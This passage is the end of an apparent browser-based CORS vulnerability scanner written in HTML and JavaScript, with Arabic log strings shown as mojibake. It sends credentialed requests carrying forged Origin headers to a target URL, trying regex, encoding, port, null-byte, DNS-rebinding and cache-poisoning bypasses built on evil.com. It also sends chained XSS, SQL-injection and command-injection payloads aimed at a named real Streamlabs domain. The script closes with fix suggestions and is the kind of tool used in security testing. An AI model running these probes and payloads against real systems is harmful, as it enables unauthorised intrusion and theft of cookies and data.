                    method: document.getElementById('method').value,
                    headers: {
                        ...JSON.parse(document.getElementById('customHeaders').value || '{}'),
                        'Origin': origin
                    },
                    mode: 'cors',
                    credentials: 'include'
                });
                
                if (result.success) {
                    const allowOrigin = result.response.headers['access-control-allow-origin'];
                    if (allowOrigin === origin || allowOrigin === '*') {
                        log(`ğŸš¨ Special character bypass: ${origin}`, 'vulnerable', result.response.headers);
                    }
                }
            }
        }
        
        async function testRegexBypass() {
            log('ğŸ­ Ø¨Ø¯Ø¡ Ø§Ø®ØªØ¨Ø§Ø± Regex Bypass...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            const urlObj = new URL(url);
            const domain = urlObj.hostname;
            
            const regexBypass = [
                `https://${domain}.evil.com`,
                `https://${domain}evil.com`,
                `https://evil${domain}`,
                `https://${domain.replace('.', 'evil.')}`,
                `https://${domain}?evil.com`,
                `https://${domain}#evil.com`,
                `https://${domain};evil.com`,
                `https://${domain}:evil.com@evil.com`,
                `https://${domain}%2eevil.com`,
                `https://${domain}%2Eevil.com`,
                `https://${domain}\\.evil.com`,
                `https://${domain}[.]evil.com`,
                `https://${domain}(.)evil.com`,
                `https://${domain}{.}evil.com`,
                `https://${domain}|evil.com`,
                `https://${domain}$evil.com`,
                `https://${domain}^evil.com`,
                `https://${domain}+evil.com`,
                `https://${domain}=evil.com`,
                `https://${domain}!evil.com`
            ];
            
            for (const origin of regexBypass) {
                stats.total++;
                const result = await makeRequest(url, {
                    method: document.getElementById('method').value,
                    headers: {
                        ...JSON.parse(document.getElementById('customHeaders').value || '{}'),
                        'Origin': origin
                    },
                    mode: 'cors',
                    credentials: 'include'
                });
                
                if (result.success) {
                    const allowOrigin = result.response.headers['access-control-allow-origin'];
                    if (allowOrigin === origin || allowOrigin === '*') {
                        log(`ğŸš¨ Regex bypass: ${origin}`, 'vulnerable', result.response.headers);
                    }
                }
            }
        }
        
        async function testPortVariations() {
            log('ğŸ”¢ Ø¨Ø¯Ø¡ Ø§Ø®ØªØ¨Ø§Ø± Port Variations...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            const urlObj = new URL(url);
            
            const ports = [
                ':80', ':443', ':8080', ':8443', ':3000', ':4000', ':5000',
                ':8000', ':8888', ':9090', ':0', ':65535', ':-1', ':99999'
            ];
            
            for (const port of ports) {
                stats.total++;
                const origin = `${urlObj.protocol}//${urlObj.hostname}${port}`;
                
                const result = await makeRequest(url, {
                    method: document.getElementById('method').value,
                    headers: {
                        ...JSON.parse(document.getElementById('customHeaders').value || '{}'),
                        'Origin': origin
                    },
                    mode: 'cors',
                    credentials: 'include'
                });
                
                if (result.success) {
                    const allowOrigin = result.response.headers['access-control-allow-origin'];
                    if (allowOrigin === origin || allowOrigin === '*') {
                        log(`ğŸš¨ Port variation bypass: ${origin}`, 'vulnerable', result.response.headers);
                    }
                }
            }
        }
        
        async function testEncodingBypass() {
            log('ğŸ” Ø¨Ø¯Ø¡ Ø§Ø®ØªØ¨Ø§Ø± Encoding Bypass...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            const urlObj = new URL(url);
            const domain = urlObj.hostname;
            
            const encodings = [
                // URL encoding
                `https://${encodeURIComponent(domain)}.evil.com`,
                `https://${domain}%2eevil%2ecom`,
                
                // Double encoding
                `https://${domain}%252eevil%252ecom`,
                
                // Unicode encoding
                `https://${domain}\u002eevil\u002ecom`,
                
                // HTML encoding
                `https://${domain}&#46;evil&#46;com`,
                
                // Mixed encoding
                `https://${domain}%2e\u0065vil.com`,
                
                // Punycode
                `https://xn--${domain}-evil.com`,
                
                // Base64 (if processed)
                btoa(`https://${domain}.evil.com`)
            ];
            
            for (const origin of encodings) {
                stats.total++;
                const result = await makeRequest(url, {
                    method: document.getElementById('method').value,
                    headers: {
                        ...JSON.parse(document.getElementById('customHeaders').value || '{}'),
                        'Origin': origin
                    },
                    mode: 'cors',
                    credentials: 'include'
                });
                
                if (result.success) {
                    const allowOrigin = result.response.headers['access-control-allow-origin'];
                    if (allowOrigin === origin || allowOrigin === '*') {
                        log(`ğŸš¨ Encoding bypass: ${origin}`, 'vulnerable', result.response.headers);
                    }
                }
            }
        }
        
        async function testChainedAttacks() {
            log('â›“ï¸ Ø¨Ø¯Ø¡ Ø§Ø®ØªØ¨Ø§Ø± Chained Attacks...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            
            // Ø³Ù„Ø³Ù„Ø© Ù…Ù† Ø§Ù„Ù‡Ø¬Ù…Ø§Øª Ø§Ù„Ù…Ø¹Ù‚Ø¯Ø©
            const chainedTests = [
                {
                    name: 'CORS + XSS Chain',
                    origin: 'https://evil.com',
                    body: JSON.stringify({
                        origin: 'https://videoeditor.streamlabs.com',
                        intent: 'connect',
                        noAuthTarget: 'login',
                        payload: '<script>alert(document.cookie)</script>'
                    })
                },
                {
                    name: 'CORS + CSRF Chain',
                    origin: 'https://evil.com',
                    headers: {
                        'X-Requested-With': 'XMLHttpRequest',
                        'X-CSRF-Token': 'fake-token'
                    }
                },
                {
                    name: 'CORS + SQLi Chain',
                    origin: 'https://evil.com',
                    body: JSON.stringify({
                        origin: "https://videoeditor.streamlabs.com' OR '1'='1",
                        intent: 'connect',
                        noAuthTarget: 'login'
                    })
                },
                {
                    name: 'CORS + Command Injection',
                    origin: 'https://evil.com',
                    body: JSON.stringify({
                        origin: 'https://videoeditor.streamlabs.com;whoami',
                        intent: 'connect',
                        noAuthTarget: 'login'
                    })
                }
            ];
            
            for (const test of chainedTests) {
                stats.total++;
                const headers = {
                    ...JSON.parse(document.getElementById('customHeaders').value || '{}'),
                    'Origin': test.origin,
                    ...test.headers
                };
                
                const result = await makeRequest(url, {
                    method: 'POST',
                    headers: headers,
                    body: test.body || document.getElementById('requestBody').value,
                    mode: 'cors',
                    credentials: 'include'
                });
                
                if (result.success) {
                    const allowOrigin = result.response.headers['access-control-allow-origin'];
                    if (allowOrigin === test.origin || allowOrigin === '*') {
                        log(`ğŸš¨ Chained attack possible: ${test.name}`, 'vulnerable', {
                            test: test,
                            response: result.response
                        });
                    }
                }
            }
        }
        
        async function runAllTests() {
            clearResults();
            log('ğŸš€ Ø¨Ø¯Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ø®ØªØ¨Ø§Ø±Ø§Øª CORS Ø§Ù„Ù…ØªÙ‚Ø¯Ù…Ø©...', 'info');
            
            const tests = [
                { name: 'Basic CORS Test', fn: testBasicCORS },
                { name: 'Origin Manipulation', fn: testOriginManipulation },
                { name: 'Subdomain Attacks', fn: testSubdomainAttacks },
                { name: 'Null Origin', fn: testNullOrigin },
                { name: 'Credentials Testing', fn: testCredentialsInclude },
                { name: 'Preflight Bypass', fn: testPreflightBypass },
                { name: 'Header Injection', fn: testHeaderInjection },
                { name: 'Protocol Downgrade', fn: testProtocolDowngrade },
                { name: 'Wildcard Bypass', fn: testWildcardBypass },
                { name: 'WebSocket CORS', fn: testWebSocketCORS },
                { name: 'Special Characters', fn: testSpecialCharacters },
                { name: 'Regex Bypass', fn: testRegexBypass },
                { name: 'Port Variations', fn: testPortVariations },
                { name: 'Encoding Bypass', fn: testEncodingBypass },
                { name: 'Chained Attacks', fn: testChainedAttacks }
            ];
            
            for (let i = 0; i < tests.length; i++) {
                log(`â³ ${tests[i].name} (${i + 1}/${tests.length})...`, 'info');
                await tests[i].fn();
                await delay(500); // ØªØ£Ø®ÙŠØ± Ø¨ÙŠÙ† Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±Ø§Øª
            }
            
            // ØªÙ‚Ø±ÙŠØ± Ù†Ù‡Ø§Ø¦ÙŠ
            log('ğŸ“Š ===== ØªÙ‚Ø±ÙŠØ± Ù†Ù‡Ø§Ø¦ÙŠ =====', 'info');
            log(`âœ… Ø¥Ø¬Ù…Ø§Ù„ÙŠ Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±Ø§Øª: ${stats.total}`, 'info');
            log(`ğŸš¨ Ø§Ù„Ø«ØºØ±Ø§Øª Ø§Ù„Ù…ÙƒØªØ´ÙØ©: ${stats.vulnerable}`, stats.vulnerable > 0 ? 'vulnerable' : 'success');
            log(`âœ“ Ø§Ù„Ø·Ù„Ø¨Ø§Øª Ø§Ù„Ù†Ø§Ø¬Ø­Ø©: ${stats.success}`, 'info');
            log(`âœ— Ø§Ù„Ø·Ù„Ø¨Ø§Øª Ø§Ù„ÙØ§Ø´Ù„Ø©: ${stats.failed}`, 'info');
            
            if (stats.vulnerable > 0) {
                log('âš ï¸ ØªØ­Ø°ÙŠØ±: ØªÙ… Ø§ÙƒØªØ´Ø§Ù Ø«ØºØ±Ø§Øª CORS! Ø±Ø§Ø¬Ø¹ Ø§Ù„Ø³Ø¬Ù„Ø§Øª Ø£Ø¹Ù„Ø§Ù‡ Ù„Ù„ØªÙØ§ØµÙŠÙ„.', 'vulnerable');
                
                // Ø§Ù‚ØªØ±Ø§Ø­Ø§Øª Ù„Ù„Ø¥ØµÙ„Ø§Ø­
                log('ğŸ’¡ Ø§Ù‚ØªØ±Ø§Ø­Ø§Øª Ø§Ù„Ø¥ØµÙ„Ø§Ø­:', 'info');
                log('1. ØªØ­Ø¯ÙŠØ¯ Ù‚Ø§Ø¦Ù…Ø© Ø¨ÙŠØ¶Ø§Ø¡ ØµØ§Ø±Ù…Ø© Ù„Ù„Ù€ Origins Ø§Ù„Ù…Ø³Ù…ÙˆØ­ Ø¨Ù‡Ø§', 'info');
                log('2. Ø¹Ø¯Ù… Ø§Ø³ØªØ®Ø¯Ø§Ù… wildcard (*) Ù…Ø¹ credentials', 'info');
                log('3. Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Origin Ø¨Ø´ÙƒÙ„ ØµØ§Ø±Ù… ÙˆÙ„ÙŠØ³ Ø¨Ù€ regex Ø¶Ø¹ÙŠÙ', 'info');
                log('4. Ø¹Ø¯Ù… Ø§Ù„Ø«Ù‚Ø© ÙÙŠ Origin header Ø§Ù„Ù‚Ø§Ø¯Ù… Ù…Ù† Ø§Ù„Ø¹Ù…ÙŠÙ„', 'info');
                log('5. Ø§Ø³ØªØ®Ø¯Ø§Ù… HTTPS Ø¯Ø§Ø¦Ù…Ø§Ù‹', 'info');
            } else {
                log('ğŸ‰ Ù…Ù…ØªØ§Ø²! Ù„Ù… ÙŠØªÙ… Ø§ÙƒØªØ´Ø§Ù Ø«ØºØ±Ø§Øª CORS ÙˆØ§Ø¶Ø­Ø©.', 'success');
            }
            
            updateProgress(100, 100);
        }
        
        // Ø¥Ø¶Ø§ÙØ© Ø§Ø®ØªØ¨Ø§Ø±Ø§Øª Ù…ØªÙ‚Ø¯Ù…Ø© Ø¥Ø¶Ø§ÙÙŠØ©
        async function testAdvancedTechniques() {
            log('ğŸ­ Ø¨Ø¯Ø¡ Ø§Ù„ØªÙ‚Ù†ÙŠØ§Øª Ø§Ù„Ù…ØªÙ‚Ø¯Ù…Ø©...', 'info');
            
            const url = document.getElementById('targetUrl').value;
            const baseHeaders = JSON.parse(document.getElementById('customHeaders').value || '{}');
            
            // 1. DNS Rebinding Attack Simulation
            log('ğŸ” Ø§Ø®ØªØ¨Ø§Ø± DNS Rebinding...', 'info');
            const dnsRebindingOrigins = [
                'http://localhost.evil.com',
                'http://127.0.0.1.evil.com',
                'http://0.0.0.0.evil.com',
                'http://[::1].evil.com'
            ];
            
            for (const origin of dnsRebindingOrigins) {
                stats.total++;
                const result = await makeRequest(url, {
                    method: document.getElementById('method').value,
                    headers: { ...baseHeaders, 'Origin': origin },
                    mode: 'cors',
                    credentials: 'include'
                });
                
                if (result.success && result.response.headers['access-control-allow-origin']) {
                    log(`ğŸš¨ DNS Rebinding vulnerability: ${origin}`, 'vulnerable');
                }
            }
            
            // 2. Cache Poisoning via CORS
            log('ğŸ” Ø§Ø®ØªØ¨Ø§Ø± Cache Poisoning...', 'info');
            const cacheHeaders = {
                ...baseHeaders,
                'Origin': 'https://evil.com',
                'Cache-Control': 'max-age=3600',
                'X-Forwarded-Host': 'evil.com',
                'X-Forwarded-Proto': 'https'
            };
            
            stats.total++;
            const cacheResult = await makeRequest(url, {
                method: 'GET',
                headers: cacheHeaders,
                mode: 'cors'
            });
            
            if (cacheResult.success) {
                const cacheControl = cacheResult.response.headers['cache-control'];
                const allowOrigin = cacheResult.response.headers['access-control-allow-origin'];
                
                if (cacheControl && allowOrigin === 'https://evil.com') {
                    log('ğŸš¨ Cache poisoning Ø¹Ø¨Ø± CORS Ù…Ù…ÙƒÙ†!', 'vulnerable', {
                        'cache-control': cacheControl,
                        'allow-origin': allowOrigin
                    });
                }
            }
            
            // 3. Browser Quirks Testing
            log('ğŸ” Ø§Ø®ØªØ¨Ø§Ø± Browser Quirks...', 'info');
            const browserQuirks = [
                { origin: 'https://evil.com\x00.trusted.com' },
                { origin: 'https://evil.com\x0d.trusted.com' },
                { origin: 'https://evil.com\x0a.trusted.com' },
                { origin: 'https://evil.com%00.trusted.com' },
                { origin: 'https://evil.com\t.trusted.com' },
                { origin: 'https://evil.com .trusted.com' }
            ];
            
            for (const quirk of browserQuirks) {
                stats.total++;
                try {
                    const result = await makeRequest(url, {
                        method: document.getElementById('method').value,
                        headers: { ...baseHeaders, 'Origin': quirk.origin },
                        mode: 'cors',
                        credentials: 'include'
                    });
                    
                    if (result.success) {
                        log(`âš ï¸ Browser quirk exploitation: ${quirk.origin}`, 'warning');
                    }
                } catch (e) {
                    // Expected in most cases
                }
            }
            
            // 4. Time-based Analysis
            log('ğŸ” Ø§Ø®ØªØ¨Ø§Ø± Time-based Analysis...', 'info');
            const timingOrigins = ['https://trusted.com', 'https://evil.com'];
            const timingResults = {};
            
            for (const origin of timingOrigins) {
                const startTime = performance.now();
                stats.total++;
                
                await makeRequest(url, {
                    method: document.getElementById('method').value,
                    headers: { ...baseHeaders, 'Origin': origin },
                    mode: 'cors',
                    credentials: 'include'
                });
                
                const endTime = performance.now();
                timingResults[origin] = endTime - startTime;
            }
            
            const timeDiff = Math.abs(timingResults['https://trusted.com'] - timingResults['https://evil.com']);
            if (timeDiff > 100) {
                log(`âš ï¸ ÙØ±Ù‚ Ø²Ù…Ù†ÙŠ ÙƒØ¨ÙŠØ± Ø¨ÙŠÙ† Ø§Ù„Ø·Ù„Ø¨Ø§Øª: ${timeDiff}ms`, 'warning', timingResults);
            }
            
            // 5. HTTP/2 and HTTP/3 Specific Tests
            log('ğŸ” Ø§Ø®ØªØ¨Ø§Ø± HTTP/2 Ùˆ HTTP/3...', 'info');
            if (window.chrome && window.chrome.loadTimes) {
                const connectionInfo = window.chrome.loadTimes();
                log(`â„¹ï¸ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„: ${JSON.stringify(connectionInfo)}`, 'info');
            }
            
            // 6. Service Worker Bypass
            log('ğŸ” Ø§Ø®ØªØ¨Ø§Ø± Service Worker Bypass...', 'info');
            if ('serviceWorker' in navigator) {
                try {
                    const registration = await navigator.serviceWorker.register('data:text/javascript,', { scope: '/' });
                    log('âš ï¸ Service Worker registration Ù…Ù…ÙƒÙ† - Ù‚Ø¯ ÙŠØªØ¬Ø§ÙˆØ² CORS', 'warning');
                    await registration.unregister();
                } catch (e) {
                    log('âœ… Service Worker registration Ù…Ø­Ù…ÙŠ', 'success');
                }
            }
            
            // 7. Shared Array Buffer Test
            log('ğŸ” Ø§Ø®ØªØ¨Ø§Ø± SharedArrayBuffer...', 'info');
            if (typeof SharedArrayBuffer !== 'undefined') {
                log('âš ï¸ SharedArrayBuffer Ù…ØªØ§Ø­ - ØªØ­Ù‚Ù‚ Ù…Ù† Cross-Origin-Embedder-Policy', 'warning');
            }
            
            // 8. Custom Protocol Handler
            log('ğŸ” Ø§Ø®ØªØ¨Ø§Ø± Custom Protocol Handler...', 'info');
            const customProtocols = [
                'web+streamlabs://evil.com',
                'streamlabs://evil.com',
                'app://evil.com'
            ];
            
            for (const protocol of customProtocols) {
                stats.total++;
                try {
                    await makeRequest(url, {
                        method: document.getElementById('method').value,
                        headers: { ...baseHeaders, 'Origin': protocol },
                        mode: 'cors'
                    });
                    log(`âš ï¸ Custom protocol accepted: ${protocol}`, 'warning');
                } catch (e) {
                    // Expected
                }
            }
            
            log('âœ… Ø§ÙƒØªÙ…Ù„Øª Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±Ø§Øª Ø§Ù„Ù…ØªÙ‚Ø¯Ù…Ø©', 'success');
        }
        
        // Event listeners for keyboard shortcuts
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey || e.metaKey) {
                switch(e.key) {
                    case 'Enter':
                        e.preventDefault();
                        runAllTests();
                        break;
                    case 's':
                        e.preventDefault();
                        exportResults();
                        break;
                    case 'l':
                        e.preventDefault();
                        clearResults();
                        break;
                }
            }
        });
        
        // Auto-save settings to localStorage
        function saveSettings() {
            const settings = {
                targetUrl: document.getElementById('targetUrl').value,
                method: document.getElementById('method').value,
                requestBody: document.getElementById('requestBody').value,
                customHeaders: document.getElementById('customHeaders').value,
                delay: document.getElementById('delay').value
            };
            localStorage.setItem('corsTestSettings', JSON.stringify(settings));
        }
        
        function loadSettings() {
            const saved = localStorage.getItem('corsTestSettings');
            if (saved) {
                const settings = JSON.parse(saved);
                document.getElementById('targetUrl').value = settings.targetUrl || '';
                document.getElementById('method').value = settings.method || 'POST';
                document.getElementById('requestBody').value = settings.requestBody || '';
                document.getElementById('customHeaders').value = settings.customHeaders || '{}';
                document.getElementById('delay').value = settings.delay || '100';
            }
        }
        
        // Save settings on change
        document.querySelectorAll('input, textarea, select').forEach(element => {
            element.addEventListener('change', saveSettings);
        });
        
        // Load settings on page load
        window.addEventListener('load', loadSettings);
        
        // Display keyboard shortcuts
        log('âŒ¨ï¸ Ø§Ø®ØªØµØ§Ø±Ø§Øª Ù„ÙˆØ­Ø© Ø§Ù„Ù…ÙØ§ØªÙŠØ­:', 'info');
        log('Ctrl+Enter: ØªØ´ØºÙŠÙ„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±Ø§Øª', 'info');
        log('Ctrl+S: ØªØµØ¯ÙŠØ± Ø§Ù„Ù†ØªØ§Ø¦Ø¬', 'info');
        log('Ctrl+L: Ù…Ø³Ø­ Ø§Ù„Ù†ØªØ§Ø¦Ø¬', 'info');
    </script>
</body>
</html>
